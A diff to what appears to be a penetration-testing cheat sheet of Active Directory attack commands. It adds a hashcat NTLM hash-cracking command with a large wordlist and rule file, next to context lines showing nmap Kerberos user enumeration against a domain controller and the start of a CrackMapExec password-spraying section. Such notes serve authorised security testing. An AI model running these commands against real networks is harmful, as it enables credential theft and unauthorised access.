@@ -26,6 +26,14 @@ ENUM USERS DOMAIN-CONTROLLER
 nmap -p88 --script krb5-enum-users --script-args krb5-enumusers.realm="cyberspacekittens.local",userdb=/opt/userlist.txt <Domain Controller IP>
 ```
 
+HASHCAT RULE
+```
+https://github.com/NotSoSecure/password_cracking_rules
+
+.\hashcat.exe -m 1000 C:\hashcat\hashes\secrets.out E:\Wordlists\rockyou2021\rockyou2021.txt -r C:\hashcat\rules\OneRuleToRuleThemAll.rule -o cracked.txt
+
+```
+
 CRACKMAPEXEC PASSWORD SPRAYING
 ```
 crackmapexec smb <targetIP> --pass-pol
